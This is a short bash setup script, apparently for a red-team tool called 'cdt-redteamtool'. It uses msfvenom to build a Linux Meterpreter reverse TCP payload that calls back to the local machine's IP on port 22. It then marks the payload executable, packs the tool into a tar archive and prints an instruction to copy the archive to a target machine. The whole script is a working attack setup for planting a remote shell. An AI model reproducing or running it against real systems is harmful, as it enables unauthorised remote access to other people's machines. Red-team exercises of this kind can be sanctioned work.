#!/bin/bash

ip=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=$ip lport=22 -f elf > /opt/cdt-redteamtool/payload/static/rev

chmod +x /opt/cdt-redteamtool/payload/static/rev

tar -cvf /tmp/cdt-redteamtool.tar -C /opt ./cdt-redteamtool/
echo -e "\n====== Setup complete. Now simply scp /tmp/cdt-redteamtool.tar to target machine ======\n"
